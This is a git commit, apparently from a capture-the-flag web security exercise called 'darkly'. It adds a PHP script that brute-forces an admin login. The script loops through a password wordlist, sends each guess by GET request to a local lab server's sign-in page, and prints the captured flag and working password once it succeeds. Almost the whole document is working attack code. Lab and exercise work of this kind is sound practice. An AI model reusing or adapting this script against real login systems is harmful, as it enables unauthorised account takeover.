9749687daed4fa223424218d5ded317656d1953b
arthur <arthurysiite@gmail.Com>
2019-09-18 16:48:15 +0200

    darkly

---
+++ brut_force/Ressources/brut.php
@@ -0,0 +1,35 @@
+<?php
+
+$br = new brut_force();
+$br->run();
+
+
+Class brut_force {
+
+	private $mdps = [];
+
+	public function __Construct() {
+
+		$this->mdps = file('data/mdp');
+	}
+
+	public function run() {
+
+
+		foreach ($this->mdps as $value) {
+
+			$value = str_replace("\n", "", $value);
+
+			$rep = file_get_contents('http://192.168.1.38/index.php?page=signin&username=admin&password='.$value.'&Login=Login#');
+			preg_match_all("#flag is :(.*)</h2>#", $rep, $matches);
+			
+			if (isset($matches[1][0])) {
+				
+				echo "flag : ".$matches[1][0]." mot de passe : ".$value;
+				exit(0);
+			}
+		}
+	}
+}
+
+?>
